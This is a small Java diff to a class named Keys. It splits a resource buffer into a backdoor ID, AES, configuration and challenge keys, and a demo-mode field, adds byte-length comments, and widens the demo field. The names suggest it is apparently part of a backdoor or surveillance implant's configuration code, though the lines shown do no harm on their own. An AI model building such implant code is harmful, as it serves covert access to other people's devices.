@@ -119,11 +119,11 @@ public class Keys {
 
 			// Richiediamo 16 byte ma incrementiamo di 32, e' corretto cosi perche'
 			// ci servono solo 16 byte
-			backdoorId = Utils.copy(resource, 0, 14);
-			aesKey = Utils.copy(resource, 14, 16);
-			confKey = Utils.copy(resource, 46, 16);
-			challengeKey = Utils.copy(resource, 78, 16);
-			demoMode = Utils.copy(resource, 110, 16);
+			backdoorId = Utils.copy(resource, 0, 14);    // 14 byte
+			aesKey = Utils.copy(resource, 14, 16);       // 16 byte
+			confKey = Utils.copy(resource, 46, 16);		 // 16 byte
+			challengeKey = Utils.copy(resource, 78, 16); // 16 byte
+			demoMode = Utils.copy(resource, 110, 24);	 // 24 byte
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " backdoorId: " + new String(backdoorId));//$NON-NLS-1$
